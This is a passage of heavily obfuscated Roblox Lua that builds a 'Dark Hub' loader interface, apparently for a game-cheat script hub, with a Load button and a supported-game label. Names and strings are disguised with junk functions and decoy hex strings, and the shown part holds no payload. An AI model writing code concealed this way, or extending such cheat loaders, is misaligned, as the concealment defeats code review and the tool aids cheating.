OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.49968192 ,0 ,0.5 ,-55 )OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(1 ,0 ,0 ,30 )OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(68 ,97 ,114 ,107 ,32 ,72 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={403,376,850,672,782}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+112,98 ,32 ,45 ,32 )..""..OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(168 ,168 ,168 )OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.TextSize=20.000  OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.TextTransparency=1.000  uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(71 ,108 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="A4038F2ED9731C6BAAD8C072457C8BABE6501D39E0B16898E3EB05BED29228B6B0A34E40B4B8088580F65D1C5E30D9BE7B17"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+11 end)(),119 ,77 ,97 ,105 ,110 )..""uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.Parent=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.BackgroundTransparency=1.000  uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.BorderSizePixel=0  uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,-19 ,0 ,-12 )uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(1.0229007 ,30 ,0.968586385 ,30 )uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.ZIndex=(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)()uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.Image=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(114 ,98 ,120 ,97 ,115 ,115 ,101 ,116 ,105 ,100 ,58 ,47 ,47 ,50 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={68,929,35,138,23}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+52,55 ,55 ,55 ,52 ,51 ,55 ,49 )..""uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.ImageColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(15 ,15 ,15 )uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.ImageTransparency=1.000  uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU.SliceCenter=UwuowOOwOuwUOwouwuuWUUWUOwOuwUOWOOWoUwUuwUUwuOwOOwOUWuOwOUwuOwO.new(20 ,20 ,280 ,280 )OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="D44441E7DD96C6F392D67BEC5D080478B4C118A465BD3FB2B0CD1B74A8C31D9AFBD"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),111 ,110 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={795,19,616,988,591}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+111,97 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="845D6152E7F0C4AD4BB413E4F91C775AD62DC292C5CC04BB389CDC68CC813F73D49CF5EDC2555637954CA00E8843A591F72B"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+5 end)(),110 ,101 ,114 ,77 ,97 ,105 ,110 )..""OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.Parent=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(33 ,33 ,33 )OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.BackgroundTransparency=1.000  OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.5 ,0 ,0.5 ,30 )OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,367 ,0 ,107 )OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,111 ,110 ,116 ,97 ,105 ,110 ,101 ,114 ,77 ,97 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="0601D8328A28ED33B7B234033E2E77B10BA4B2DC9B683675BB6A1F89BD292CD2E51C80E2B94742E5869FABE74AFEBD9CEDBC"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+5 end)(),110 ,85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 )..""UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU.Parent=OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(76 ,111 ,97 ,100 ,66 ,116 ,110 )..""uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Parent=OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(39 ,39 ,39 )uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.BackgroundTransparency=1.000  uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.501362383 ,0 ,0.658606648 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)())uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,313 ,0 ,29 )uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.AutoButtonColor=false  uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(76 ,111 ,97 ,100 )..""uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(195 ,195 ,195 )uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.TextSize=14.000  uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.TextTransparency=1.000  OwOUwUOwOUWuOwoOWoOwOUWUuwUUwUuwuOwOowOOwoUwUOwOOwoOwOOwOOwoOwO.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,6 )OwOUwUOwOUWuOwoOWoOwOUWUuwUUwUuwuOwOowOOwoUwUOwOOwoOwOOwOOwoOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(76 ,111 ,97 ,100 ,66 ,116 ,110 ,85 ,73 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="64211782DC4FE5C9E4E84696CD373B689E507156F48CA2CB650BB725FF9FA5BF71F"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),111 ,114 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={488,189,761,148,687}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+105,101 ,114 )..""OwOUwUOwOUWuOwoOWoOwOUWUuwUUwUuwuOwOowOOwoUwUOwOOwoOwOOwOOwoOwO.Parent=uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(71 ,97 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="E189FF10443BF4F0C4FF2F55FFBEDFF2AC3B2D1FDC4A944EBF38759E8B40FE439365D3390DFB7DC250636E6B3BEE3D68922A"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+9 end)(),101 ,84 ,101 ,120 ,116 )..""uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Parent=OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.BackgroundTransparency=1.000  uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.5 ,0 ,0.450819671 ,-15 )uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={643,956,979,302,939}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+73,0 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="520C4D79C600F6D89407B3C05BE1BD"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)())uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham if UwUOwOuWuOwOuWUOwOUWuuwUoWOuwUUwuOwOowOowoOwOUWuoWoUwUuwUOwOowO()then uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(83 ,117 ,112 ,112 ,111 ,114 ,116 ,101 ,100 ,32 ,45 ,32 )..''..UwUUwuOwOOwOuWUuWUowOOwOuwUUwUOWOuwUOwOoWOuwUowOuWuUWuowOUwuowO else uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(78  ,111  ,116  ,32  ,83  ,117  ,112  ,112  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={361,177,655,685,523}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+106,114  ,116  ,101  ,100  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={284,849,86,851,403}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+27,45  ,32  ,85  ,110  ,105  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(49 ,68 ,66 ,70 ,67 ,50 ,56 ,67 ,67 ,65 ,67 ,52 ,49 ,55 ,52 ,53 ,52 ,54 ,50 ,52 ,67 ,48 ,49 ,50 ,65 ,52 ,66 ,65 ,69 ,56 ,65 ,65 ,53 ,68 ,65 ,48 ,57 ,66 ,67 ,53 ,52 ,55 ,68 ,68 ,66 ,55 ,68 ,55 ,51 ,69 ,49 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="8254D83BA3257CF172E1A7C0EC9D7A2727584F9D34B5B9ECF"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),65 ,57 ,67 ,66 ,69 ,55 ,48 ,51 ,57 ,48 ,51 ,53 ,48 ,56 ,68 ,54 ,66 ,52 ,53 ,57 ,48 ,51 ,68 ,53 ,49 ,56 ,69 ,50 ,57 ,68 ,52 ,49 ,70 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={273,243,711,43,328}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+64,57 ,55 ,53 ,57 ,69 ,52 ,49 ,70 ,65 ,56 ,70 ,65 ,50 ,66 )..""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+18  end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="466830ACE9F95663F169E5E16703BB3D728279ED4480C3CF60D1561097A81300EABF116E298221DE41BBB3454A1AD19EEEFF"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+1 end)(),114  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="37379C810F397EF0312C8E3433A7B2E7BC8F11B539C9E7AAC1C89C4ACD87982A7D64848AF7538A890CDA913626F00F7CE0A7"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+495 end)(),316 ,684 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="371E053C8BC0536AA674F73C39E0DDD99489861E06832A60BC6B72E79DF7C2C76AFF84CA74AFBC9F03EFCC26221365665BEC"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+238 end)(),621 }return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+110 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={187,915,863,246,539}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+92,108  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..''end uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(168 ,168 ,168 )uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.TextSize=20.000  uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU.TextTransparency=1.000  OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,110 ,102 ,111 ,70 ,114 ,97 ,109 ,101 )..""OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.Parent=OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(79 ,79 ,79 )OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.BackgroundTransparency=1.000  OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.333072931 ,0 ,0.5 ,0 )OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,192 ,0 ,191 )OwoOwOOwOUwuUwUOwOOwOUwUUwuoWoOwouwUuWUUwUUwuOwOUWUUwuowOoWoOwo.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )OwoOwOOwOUwuUwUOwOOwOUwUUwuoWoOwouwUuWUUwUUwuOwOUWUUwuowOoWoOwo.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,110 ,102 ,111 ,70 ,114 ,97 ,109 ,101 ,85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 )..""OwoOwOOwOUwuUwUOwOOwOUwUUwuoWoOwouwUuWUUwUUwuOwOUWUUwuowOoWoOwo.Parent=OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU 